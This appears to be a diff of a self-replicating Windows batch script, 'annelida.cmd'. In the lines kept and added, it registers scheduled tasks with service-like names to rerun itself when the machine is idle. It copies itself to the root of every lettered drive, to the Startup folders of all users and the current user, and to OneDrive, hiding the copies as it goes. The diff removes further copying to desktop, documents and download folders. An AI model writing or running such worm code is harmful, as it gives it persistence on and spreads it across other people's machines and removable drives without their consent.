@@ -18,7 +18,7 @@ set currentIteration=0 %= 2023-05-13 =% & goto begin
 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 ::                                                                                                                               ::
 ::                                                                                                                               ::
-::	The scipt will automatically delete itself after this year for safety.                                                   ::
+::                          The scipt will automatically delete itself after the below year for safety.                          ::
 set allowedYear=2023
 ::                                                                                                                               ::
 ::                                                                                                                               ::
@@ -54,10 +54,9 @@ set allowedYear=2023
 ::                                                                                                                               ::
 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 
-
 @echo off
 mode 17, 1
-cls
+clse
 setLocal enableDelayedExpansion
 
 :: This stops the script from running and deletes it during any year other than what is allowed
@@ -65,13 +64,14 @@ if "%date%" == "!date:%allowedYear%=!" del "%~f0" && exit
 
 set /a currentIteration=currentIteration+1
 
-schtasks /create /sc onidle /i 15 /tn "svc1anlda" /tr "%~f0"
-schtasks /create /sc onidle /i 30 /tn "svc2anlda" /tr "%~f0"
+::Create tasks to run after computer is idle for 15 and 30 minutes
+schtasks /create /sc onidle /i 15 /tn "svc1annelida" /tr "%~f0"
+schtasks /create /sc onidle /i 30 /tn "svc2annelida" /tr "%~f0"
 
-if not exist "%annelida.cmd%" move "%~f0" annelida.cmd
+::Change file name if it's not what it should be, though this code is broken. Honestly forgot why I added it in the first place.
+::if not exist "%cd%\annelida.cmd" move "%~f0" annelida.cmd
 
-
-%= Copies to the root directory of all drives which have assigned letters =%
+::Copies to the root directory of all drives which have assigned letters =%
 set alphabet=ABCDEFGHIJKLMNOPQRSTUVWXYZ
 set alphabetIndex=0
 :driveCopyLoop
@@ -86,8 +86,6 @@ set alphabetIndex=0
 	set /a alphabetIndex=alphabetIndex+1
 if not "%alphabetIndex%" == "25" goto driveCopyLoop
 
-
-
 if exist "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" ( %= Copies to the startup folder of all users =%
 	if not exist "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd" (
 		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"& type "%~f0" >> "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"
@@ -100,51 +98,9 @@ if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" ( %= Copies t
 	)
 )
 
-if exist "%windir%" ( %= Copies to the root Windows directory of the current computer =%
-	if not exist "%windir%\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%windir%\annelida.cmd"& type "%~f0" >> "%windir%\annelida.cmd"& attrib +h "%windir%\annelida.cmd"
-	)
-)
-
 if exist "%onedrive%" ( %= Copies to the OneDrive of the current user =%
 	if not exist "%onedrive%\annelida.cmd" (
 		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%onedrive%\annelida.cmd"& type "%~f0" >> "%onedrive%\annelida.cmd"& attrib +h "%onedrive%\annelida.cmd"
-	)
-)
-
-if exist "%userprofile%\Desktop" ( %= Copies to the desktop of the current user =%
-	if not exist "%userprofile%\Desktop\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%userprofile%\Desktop\annelida.cmd"& type "%~f0" >> "%userprofile%\Desktop\annelida.cmd"& attrib +h "%userprofile%\Desktop\annelida.cmd"
-	)
-)
-
-if exist "%userprofile%\Documents" ( %= Copies to the documents of the current user =%
-	if not exist "%userprofile%\Documents\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%userprofile%\Documents\annelida.cmd"& type "%~f0" >> "%userprofile%\Documents\annelida.cmd"& attrib +h "%userprofile%\Documents\annelida.cmd"
-	)
-)
-
-if exist "%userprofile%\Downloads" ( %= Copies to the downloads of the current user =%
-	if not exist "%userprofile%\Downloads\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%userprofile%\Downloads\annelida.cmd"& type "%~f0" >> "%userprofile%\Downloads\annelida.cmd"& attrib +h "%userprofile%\Downloads\annelida.cmd"
-	)
-)
-
-if exist "%public%\Desktop" ( %= Copies to the desktop of all users =%
-	if not exist "%public%\Desktop\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%public%\Desktop\annelida.cmd"& type "%~f0" >> "%public%\Desktop\annelida.cmd"& attrib +h "%public%\Desktop\annelida.cmd"
-	)
-)
-
-if exist "%public%\Documents" ( %= Copies to the documents of all users =%
-	if not exist "%public%\Documents\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%public%\Documents\annelida.cmd"& type "%~f0" >> "%public%\Documents\annelida.cmd"& attrib +h "%public%\Documents\annelida.cmd"
-	)
-)
-
-if exist "%public%\Downloads" ( %= Copies to the downloads of all users =%
-	if not exist "%public%\Downloads\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%public%\Downloads\annelida.cmd"& type "%~f0" >> "%public%\Downloads\annelida.cmd"& attrib +h "%public%\Downloads\annelida.cmd"
 	)
 )
 
